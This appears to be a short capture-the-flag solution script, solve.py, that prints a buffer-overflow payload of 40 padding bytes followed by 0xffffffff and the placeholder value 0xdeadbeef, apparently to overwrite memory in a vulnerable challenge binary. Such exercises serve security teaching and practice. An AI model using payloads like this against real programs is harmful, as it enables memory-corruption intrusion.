# solve.py
payload = b"A" * 40 + b"\xff\xff\xff\xff" + b"\xef\xbe\xad\xde"
print(payload.decode('latin1'), end='')
